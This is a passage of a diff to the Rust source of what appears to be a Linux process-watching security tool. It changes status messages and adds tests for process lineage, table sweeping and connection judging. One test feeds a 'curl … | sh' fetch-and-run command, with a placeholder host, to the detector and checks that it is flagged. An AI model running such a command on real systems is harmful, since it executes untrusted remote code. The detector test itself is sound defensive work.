+        "  The watcher will be stopped (systemctl --user disable --now {UNITE})."
     );
     match (&texte, a_nous) {
         (Some(_), true) => trp!(
-            "  Son unité est retirée : {}",
-            "  Its unit is removed: {}",
+            "  Son unité sera retirée : {}",
+            "  Its unit will be removed: {}",
             crate::ui::chemin_affichable(&chemin)
         ),
         (Some(_), false) => trp!(
-            "  Une unité de ce nom existe, mais Vanguard ne l'a pas posée : arrêtée, elle reste en place ({}).",
-            "  A unit of that name exists, but Vanguard did not set it up: stopped, it stays in place ({}).",
+            "  Une unité de ce nom existe, mais Vanguard ne l'a pas posée : elle sera arrêtée et restera en place ({}).",
+            "  A unit of that name exists, but Vanguard did not set it up: it will be stopped and stay in place ({}).",
             crate::ui::chemin_affichable(&chemin)
         ),
         (None, _) => {}
@@ -1658,6 +1899,13 @@ fn juger_etat(voulu: bool, activee: Option<bool>, etat: Option<&Etat>, vivant: b
                 texte.push(' ');
                 texte.push_str(&t);
             };
+            if e.sans_programme > 0 {
+                ajouter(trf!(
+                    "Parmi les lus en entier, {} d'un autre compte jugé(s) sur leur ligne de commande seule : leur programme ne se lit pas sans droits, et le dossier d'où il part n'est pas vérifié.",
+                    "Among those read in full, {} from another account judged on their command line only: their program cannot be read without rights, and the folder it starts from is not checked.",
+                    e.sans_programme
+                ));
+            }
             if e.en_pause {
                 ajouter(
                     tr!(
@@ -1695,7 +1943,13 @@ fn juger_etat(voulu: bool, activee: Option<bool>, etat: Option<&Etat>, vivant: b
                     .to_string(),
                 );
             }
-            ok(CAT, texte)
+            // En pause, sans fins de prises, avec des pertes ou des listes manquantes : une partie n'est pas vérifiée.
+            // Le signe n'est donc pas vert (la note ne change pas), comme pour la protection en temps réel coupée.
+            if e.en_pause || e.sans_prises.is_some() || e.perdus > 0 || e.listes.is_some() {
+                alerte(CAT, Niveau::Info, texte)
+            } else {
+                ok(CAT, texte)
+            }
         }
         (true, _, None) => {
             let raison = etat
@@ -1942,7 +2196,7 @@ mod tests {
         assert_eq!(noyau_suffisant("6.5.13"), Some(false));
         assert_eq!(noyau_suffisant("6.6"), Some(true));
         assert_eq!(noyau_suffisant("6.10.2"), Some(true));
-        assert_eq!(noyau_suffisant("7.2.8-9-omarchy"), Some(true));
+        assert_eq!(noyau_suffisant("7.1.3-2-arch1"), Some(true));
         assert_eq!(noyau_suffisant("5.15.0-91-generic"), Some(false));
         assert_eq!(noyau_suffisant("abc"), None);
         assert_eq!(noyau_suffisant("6"), None);
@@ -1980,6 +2234,22 @@ mod tests {
         // Un autre compte : la ligne sans le programme.
         let autre = lecture_de(203, None, Some(b"/usr/bin/sleep\x0030\0"), None);
         assert!(matches!(autre, Lecture::Complet(ref p) if p.nom == "sleep" && p.chemin.is_none()));
+    }
+
+    #[test]
+    fn status_avec_un_nom_qui_n_est_pas_de_l_utf8() {
+        // Le noyau écrit le nom court tel quel : un octet 0xff (prctl, nom de fichier) ne doit pas faire perdre le
+        // parent ni l'état zombie, donc le jugement sur le nom.
+        let octets = b"Name:\tx\xffmrig\nState:\tZ (zombie)\nPPid:\t100\n";
+        let status = status_lisible(octets);
+        let lu = lecture_de(204, None, Some(b""), Some(&status));
+        assert!(
+            matches!(lu, Lecture::NomSeul(ref p) if p.nom == "x\u{fffd}mrig" && p.parent == Some(100)),
+            "{lu:?}"
+        );
+        let vivant = status_lisible(b"Name:\t\xfe\nState:\tS (sleeping)\nPPid:\t7\n");
+        let lu = lecture_de(205, None, Some(b"/home/alice/a\0"), Some(&vivant));
+        assert!(matches!(lu, Lecture::Complet(ref p) if p.parent == Some(7)), "{lu:?}");
     }
 
     fn en_marche(pid: u32, nom: &str, ligne: Option<&str>) -> EnMarche {
@@ -2056,6 +2326,8 @@ mod tests {
             "{a:?}"
         );
         assert!(a.texte.contains("TCP"), "{}", a.texte);
+        // Le veilleur ne mesure pas la durée d'une connexion : le titre ne la dit pas « brève ».
+        assert!(a.titre.contains("fermée") && !a.titre.contains("brève"), "{}", a.titre);
         assert_eq!(juger_prise(&fin("203.0.113.7:80"), &liste), None);
         assert_eq!(juger_prise(&fin("127.0.0.1:443"), &liste), None);
     }
@@ -2107,7 +2379,15 @@ mod tests {
         // Vanguard et sa descendance.
         t.inserer(30, Some(1), "vanguard", true, &tous);
         t.fourche(30, 31, &tous);
-        t.lancement(31, Some(&en_marche(31, "notify-send", None)), false, &tous);
+        t.lancement(
+            31,
+            Some(&EnMarche {
+                parent: Some(30),
+                ..en_marche(31, "notify-send", None)
+            }),
+            false,
+            &tous,
+        );
         assert!(t.de_vanguard(31) && !t.de_vanguard(12));
         // La fin vide la fiche.
         t.fin(13);
@@ -2120,12 +2400,196 @@ mod tests {
         assert!(t.fiches.len() <= TABLE_MAX);
         assert!(t.ordre.len() <= 2 * TABLE_MAX + 1);
         assert!(!t.fiches.contains_key(&0) && t.fiches.contains_key(&u32::try_from(TABLE_MAX + 49).unwrap()));
+        // Pleine de nouveau, avec une moitié de disparus : le balayage les retire tous.
+        let mut pid = u32::try_from(TABLE_MAX + 50).unwrap();
+        while t.fiches.len() < TABLE_MAX {
+            t.inserer(pid, None, "x", false, &tous);
+            pid += 1;
+        }
         let pairs = |p: u32| p.is_multiple_of(2);
         t.inserer(u32::MAX, None, "y", false, &pairs);
         assert!(t.fiches.len() < TABLE_MAX / 2 + 10);
         // Un nom fabriqué est borné.
         t.inserer(5, None, "ééééééééééééééééé", false, &tous);
         assert!(t.fiches[&5].nom.len() <= NOM_MAX);
+    }
+
+    #[test]
+    fn table_pleine_de_vivants_balayee_rarement() {
+        // Une fork bomb : tous les processus vivent. Un balayage (un stat par fiche) ne revient qu'après au moins
+        // TABLE_MAX/8 nouvelles fiches, au lieu d'un à chaque fourche.
+        let stats = std::cell::Cell::new(0usize);
+        let tous = |_: u32| {
+            stats.set(stats.get() + 1);
+            true
+        };
+        let mut t = Table::default();
+        t.inserer(1, None, "vanguard", true, &tous);
+        for pid in 2..=u32::try_from(TABLE_MAX).unwrap() {
+            t.inserer(pid, Some(1), "x", false, &tous);
+        }
+        assert_eq!((t.fiches.len(), stats.get()), (TABLE_MAX, 0));
+        let mut pid = 1_000_000;
+        for _ in 0..TABLE_MAX / 8 {
+            t.fourche(pid - 1, pid, &tous);
+            pid += 1;
+        }
+        assert_eq!(
+            stats.get(),
+            TABLE_MAX,
+            "un seul balayage pour {} fourches",
+            TABLE_MAX / 8
+        );
+        assert!(t.fiches.len() <= TABLE_MAX);
+        for _ in 0..TABLE_MAX / 8 {
+            t.fourche(pid - 1, pid, &tous);
+            pid += 1;
+        }
+        assert!(stats.get() <= 2 * TABLE_MAX, "{}", stats.get());
+        // La racine, la plus ancienne de toutes, n'a pas été oubliée.
+        assert!(t.fiches.get(&1).is_some_and(|f| f.racine));
+    }
+
+    #[test]
+    fn la_marque_de_vanguard_ne_se_transmet_pas() {
+        let tous = |_: u32| true;
+        let mut t = Table::default();
+        t.inserer(1, None, "systemd", false, &tous);
+        t.inserer(30, Some(1), "vanguard", true, &tous);
+        // Vanguard ouvre le tableau de bord : xdg-open, puis le navigateur.
+        t.fourche(30, 40, &tous);
+        let lu = |pid: u32, parent: u32, nom: &str| EnMarche {
+            parent: Some(parent),
+            ..en_marche(pid, nom, None)
+        };
+        t.lancement(40, Some(&lu(40, 30, "xdg-open")), false, &tous);
+        t.fourche(40, 41, &tous);
+        t.lancement(41, Some(&lu(41, 40, "firefox")), false, &tous);
+        assert!(t.de_vanguard(40) && t.de_vanguard(41));
+        // xdg-open se termine : le navigateur est rattaché ailleurs, et ce qu'il lance ensuite est jugé.
+        t.fin(40);
+        assert!(!t.de_vanguard(41));
+        t.fourche(41, 42, &tous);
+        t.lancement(42, Some(&lu(42, 41, "sh")), false, &tous);
+        assert!(!t.de_vanguard(42));
+        let l = lance(
+            Lecture::Complet(en_marche(42, "sh", Some("sh -c curl https://x.example/a | sh"))),
+            &["firefox", "sh"],
+            t.de_vanguard(42),
+        );
+        assert!(juger_lance(&l).is_some());
+        // Un processus de Vanguard qui lance autre chose n'est plus une racine ; ses enfants ne le sont jamais.
+        t.fourche(30, 50, &tous);
+        assert!(t.de_vanguard(50) && !t.fiches[&50].racine);
+        t.lancement(30, Some(&lu(30, 1, "bash")), false, &tous);
+        assert!(!t.de_vanguard(30) && !t.de_vanguard(50));
+        // Une boucle de parents ou une chaîne trop longue s'arrête, sans racine.
+        t.inserer(60, Some(61), "a", false, &tous);
+        t.inserer(61, Some(60), "b", false, &tous);
+        assert!(!t.de_vanguard(60));
+        t.inserer(1000, None, "vanguard", true, &tous);
+        for p in 1001..1100 {
+            t.inserer(p, Some(p - 1), "x", false, &tous);
+        }
+        assert!(t.de_vanguard(1000 + u32::try_from(CHAINE_MAX).unwrap() - 1));
+        assert!(!t.de_vanguard(1099));
+    }
+
+    #[test]
+    fn un_tour_rend_toujours_la_main() {
+        let jamais = || false;
+        // Une inondation sans fin sur les deux flux : le tour s'arrête au budget de chacun, en les lisant à tour de
+        // rôle (les fins de prises ne passent pas après tout le connecteur).
+        let mut lus = Vec::new();
+        a_tour_de_role(&[true, true], 5, Duration::from_secs(60), &jamais, |i| {
+            lus.push(i);
+            Ok(true)
+        })
+        .unwrap();
+        assert_eq!(lus, [0, 1, 0, 1, 0, 1, 0, 1, 0, 1]);
+        // Un flux vide s'arrête, l'autre continue jusqu'à son budget ; un flux pas prêt n'est pas lu.
+        let mut lus = Vec::new();
+        a_tour_de_role(&[true, true], 4, Duration::from_secs(60), &jamais, |i| {
+            lus.push(i);
+            Ok(i == 0)
+        })
+        .unwrap();
+        assert_eq!(lus, [0, 1, 0, 0, 0]);
+        let mut lus = Vec::new();
+        a_tour_de_role(&[false, true], 3, Duration::from_secs(60), &jamais, |i| {
+            lus.push(i);
+            Ok(true)
+        })
+        .unwrap();
+        assert_eq!(lus, [1, 1, 1]);
+        // L'arrêt demandé, ou la durée du tour, l'arrête tout de suite, même avec du budget.
+        let mut n = 0;
+        a_tour_de_role(&[true], usize::MAX, Duration::from_secs(60), &|| true, |_| {
+            n += 1;
+            Ok(true)
+        })
+        .unwrap();
+        assert_eq!(n, 1);
+        let debut = Instant::now();
+        a_tour_de_role(&[true], usize::MAX, Duration::from_millis(20), &jamais, |_| Ok(true)).unwrap();
+        assert!(debut.elapsed() < Duration::from_secs(5));
+        // Une erreur remonte.
+        assert_eq!(
+            a_tour_de_role(&[true, true], 10, Duration::from_secs(60), &jamais, |i| if i == 1 {
+                Err(libc::EIO)
+            } else {
+                Ok(true)
+            }),
+            Err(libc::EIO)
+        );
+        assert!(MESSAGES_PAR_TOUR > 0 && DUREE_DE_TOUR < Duration::from_secs(1));
+    }
+
+    #[test]
+    fn refus_passagers_relances() {
+        assert_eq!(resultat_de_l_accuse(0), Ok(()));
+        assert_eq!(resultat_de_l_accuse(1), Err(Refus::Interdit));
+        for err in [libc::ENOMEM, libc::EAGAIN, libc::ENOBUFS] {
+            assert_eq!(resultat_de_l_accuse(err.unsigned_abs()), Err(Refus::Passager));
+        }
+        assert_eq!(resultat_de_l_accuse(22), Err(Refus::Erreur(22)));
+        // Sans accusé : passager après une perte, définitif sans, arrêt d'abord.
+        assert_eq!(refus_sans_accuse(false, true), Refus::Passager);
+        assert_eq!(refus_sans_accuse(false, false), Refus::SansAccuse);
+        assert_eq!(refus_sans_accuse(true, true), Refus::Arrete);
+        // 77 (jamais relancé) seulement quand relancer n'y changerait rien.
+        for r in [Refus::Absent, Refus::Interdit, Refus::SansAccuse] {
+            assert_eq!(r.sortie(), SORTIE_REFUS, "{r:?}");
+        }
+        for r in [Refus::Passager, Refus::Erreur(libc::EIO)] {
+            assert_eq!(r.sortie(), 1, "{r:?}");
+        }
+        assert_eq!(Refus::Arrete.sortie(), 0);
+        for r in [Refus::Passager, Refus::Arrete] {
+            assert_ne!(r.raison(), "");
+        }
+        // Une demande renvoyée a un jeton à elle.
+        let premier = jeton_d_abonnement();
+        let mut jetons = vec![premier, premier.wrapping_add(2) | 0x8000_0000];
+        for _ in 0..DEMANDES_MAX {
+            let j = nouveau_jeton(&jetons);
+            assert!(!jetons.contains(&j) && (0x8000_0000..u32::MAX).contains(&j));
+            jetons.push(j);
+        }
+    }
+
+    #[test]
+    fn unite_etrangere_jamais_ecrasee() {
+        assert_eq!(
+            place_libre(Err(std::io::Error::from(std::io::ErrorKind::NotFound))),
+            Ok(())
+        );
+        assert_eq!(place_libre(Ok(unite_dans("/x", false).into_bytes())), Ok(()));
+        assert_eq!(place_libre(Ok(unite_dans("/x", true).into_bytes())), Ok(()));
+        let etrangere = place_libre(Ok(b"[Unit]\nDescription=celle d'alice\n".to_vec())).unwrap_err();
+        assert!(etrangere.contains("rien n'est posé"), "{etrangere}");
+        assert!(place_libre(Ok(vec![0xff, 0xfe])).is_err());
+        assert!(place_libre(Err(std::io::Error::from(std::io::ErrorKind::PermissionDenied))).is_err());
     }
 
     #[test]
@@ -2216,6 +2680,7 @@ mod tests {
         assert_eq!(disparu.probleme, Some(Niveau::Eleve));
         let allume = juger_etat(true, Some(true), Some(&e), true, Some(true));
         assert!(allume.verifie && allume.probleme.is_none(), "{}", allume.message);
+        assert!(!allume.message.contains("autre compte"), "{}", allume.message);
         assert!(
             allume
                 .message
@@ -2234,6 +2699,34 @@ mod tests {
             "{}",
             pause.message
         );
+        // Ce qui n'est pas vérifié n'a jamais le signe vert : en pause, sans fins de prises, avec des pertes, sans
+        // une liste.
+        assert_eq!(pause.probleme, Some(Niveau::Info));
+        for partiel in [
+            Etat {
+                en_pause: true,
+                ..e.clone()
+            },
+            Etat {
+                sans_prises: Some("refusées".into()),
+                ..e.clone()
+            },
+            Etat { perdus: 3, ..e.clone() },
+            Etat {
+                listes: Some("liste de ThreatFox non vérifiée".into()),
+                ..e.clone()
+            },
+        ] {
+            let c = juger_etat(true, Some(true), Some(&partiel), true, Some(true));
+            assert_eq!(c.probleme, Some(Niveau::Info), "{}", c.message);
+        }
+        // Les programmes d'un autre compte, lus par leur ligne seule, sont dits à part.
+        let autres = Etat {
+            sans_programme: 9,
+            ..e.clone()
+        };
+        let c = juger_etat(true, Some(true), Some(&autres), true, Some(true));
+        assert!(c.message.contains("9 d'un autre compte"), "{}", c.message);
         let arrete = Etat {
             raison_arret: Some("erreur de lecture du noyau".into()),
             ..e
@@ -2314,8 +2807,10 @@ mod tests {
 
     /// Sur le vrai noyau : un programme d'une milliseconde et une connexion brève vers la machine elle-même, vus par
     /// le veilleur et manqués par la passe horaire. Sans connecteur ouvert aux comptes ordinaires (espace de noms de
-    /// `unshare -rn`, conteneur, noyau plus ancien), l'essai se dit sauté, rien de vérifié ; avec
-    /// VANGUARD_EXIGER_VEILLEUR=1, ce même échec fait échouer le test, pour prouver ici qu'il a vraiment tourné.
+    /// `unshare -rn`, conteneur, noyau plus ancien), l'essai se dit sauté, rien de vérifié, et libtest le compte
+    /// pourtant réussi ; avec VANGUARD_EXIGER_VEILLEUR=1, ce même échec fait échouer le test. `outils/verifier.sh` la
+    /// pose pour la suite Linux avec Internet (pas pour la passe `unshare -rn`) ; la CI de GitHub ne la pose pas :
+    /// l'essai peut y être sauté, il n'y prouve donc rien.
     #[test]
     fn voit_un_lancement_bref_et_une_connexion_breve() {
         let exige = std::env::var_os("VANGUARD_EXIGER_VEILLEUR").is_some_and(|v| v == "1");
